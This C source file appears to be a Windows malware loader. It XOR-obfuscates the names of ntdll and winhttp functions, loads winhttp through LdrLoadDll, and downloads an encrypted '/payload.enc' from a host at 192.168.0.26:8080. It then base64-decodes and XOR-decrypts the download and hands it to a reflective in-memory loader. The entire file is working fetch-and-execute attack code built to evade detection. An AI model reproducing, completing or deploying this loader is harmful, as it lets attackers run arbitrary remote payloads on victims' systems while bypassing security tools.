#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "obfuscation.h"
#include "reflective.h"
#include <winhttp.h>

typedef BOOL(WINAPI* DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _ANSI_STRING { USHORT Length; USHORT MaximumLength; _Field_size_bytes_part_opt_(MaximumLength, Length) PCHAR Buffer; } ANSI_STRING, * PANSI_STRING;
typedef WORD INTERNET_PORT;
typedef LPVOID HINTERNET;
typedef HINTERNET* LPHINTERNET;
typedef NTSTATUS(NTAPI* NtLdrLoadDll) (_In_opt_ PWSTR DllPath, _In_opt_ PULONG DllCharacteristics, _In_ PUNICODE_STRING DllName, _Out_ PVOID* DllHandle);
typedef NTSTATUS(NTAPI* NtLdrGetProcedureAddress) (_In_ PVOID DllHandle, _In_opt_ PANSI_STRING ProcedureName, _In_opt_ ULONG ProcedureNumber, _Out_ PVOID* ProcedureAddress);

const char key[] = "HB/783-/48@Nvfebv";
char ntdll_XOR[] = { 0x26, 0x36, 0x4B, 0x5B, 0x54, 0x1D, 0x49, 0x43, 0x58, 0x00 };
char winhttp_XOR[] = { 0x3F, 0x2B, 0x41, 0x5F, 0x4C, 0x47, 0x5D, 0x01, 0x50, 0x54, 0x2C, 0x00 };
char GET_XOR[] = { 0x0F, 0x07, 0x7B, 0x00 };
char LdrLoadDll_XOR[] = { 0x04, 0x26, 0x5D, 0x7B, 0x57, 0x52, 0x49, 0x6B, 0x58, 0x54, 0x00 };
char LdrUnloadDll_XOR[] = { 0x04, 0x26, 0x5D, 0x62, 0x56, 0x5F, 0x42, 0x4E, 0x50, 0x7C, 0x2C, 0x22, 0x00 };
char LdrGetProcedureAddress_XOR[] = { 0x04, 0x26, 0x5D, 0x70, 0x5D, 0x47, 0x7D, 0x5D, 0x5B, 0x5B, 0x25, 0x2A, 0x03, 0x14, 0x00, 0x23, 0x12, 0x2C, 0x30, 0x4A, 0x44, 0x4B, 0x00 };

int main()
{
	xor (ntdll_XOR, sizeof(ntdll_XOR) - 1, key);
	wchar_t wc[10];
	mbstowcs(wc, ntdll_XOR, 10);

	xor (winhttp_XOR, sizeof(winhttp_XOR) - 1, key);
	wchar_t dllNameBuffer[12];
	mbstowcs(dllNameBuffer, winhttp_XOR, 12);

	xor (GET_XOR, sizeof(GET_XOR) - 1, key);
	wchar_t GET[4];
	mbstowcs(GET, GET_XOR, 4);

	xor (LdrLoadDll_XOR, sizeof(LdrLoadDll_XOR) - 1, key);
	xor (LdrUnloadDll_XOR, sizeof(LdrUnloadDll_XOR) - 1, key);
	xor (LdrGetProcedureAddress_XOR, sizeof(LdrGetProcedureAddress_XOR) - 1, key);


	HMODULE hModule = GetModuleHandleW(wc);
	NtLdrLoadDll LoadLib = (NtLdrLoadDll)GetProcAddress(hModule, LdrLoadDll_XOR);
	NtLdrGetProcedureAddress GetProcAdd = (NtLdrGetProcedureAddress)GetProcAddress(hModule, LdrGetProcedureAddress_XOR);
	UNICODE_STRING dllName;
	dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
	dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
	dllName.Buffer = dllNameBuffer;

	ULONG dllCharacteristics = 0;
	PVOID moduleHandle = NULL;
	NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);

	HINTERNET hSession = WinHttpOpen(NULL, 0, 0, 0, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.0.26", 8080, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/payload.enc", NULL, 0, 0, 0);
	BOOL bResults = WinHttpSendRequest(hRequest, 0, 0, 0, 0, 0, 0);
	bResults = WinHttpReceiveResponse(hRequest, NULL);

	DWORD dwStatusCode = 0;
	DWORD dwSize = sizeof(dwStatusCode);
	WinHttpQueryHeaders(hRequest, 19 | 0x20000000, 0, &dwStatusCode, &dwSize, 0);
	DWORD dwSizeAvailable = 0;
	DWORD dwDownloaded = 0;
	char* pszOutBuffer;
	size_t totalSize = 0;
	char* fullBinaryData = NULL;

	do
	{
		dwSizeAvailable = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwSizeAvailable))
			break;
		pszOutBuffer = (char*)malloc(dwSizeAvailable + 1);
		if (!pszOutBuffer)
			break;
		else
		{
			ZeroMemory(pszOutBuffer, dwSizeAvailable + 1);
			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSizeAvailable, &dwDownloaded)) {
				free(pszOutBuffer);
				break;
			}
			char* temp = (char*)realloc(fullBinaryData, totalSize + dwDownloaded);
			if (temp == NULL) {
				free(fullBinaryData);
				free(pszOutBuffer);
				break;
			}
			fullBinaryData = temp;
			memcpy(fullBinaryData + totalSize, pszOutBuffer, dwDownloaded);
			totalSize += dwDownloaded;
			free(pszOutBuffer);
		}
	} while (dwSizeAvailable > 0);

	size_t decodedSize;
	char* decoded = base64(fullBinaryData, totalSize, &decodedSize);
	xor (decoded, decodedSize - 1, key);
	reflective(decoded, decodedSize);
}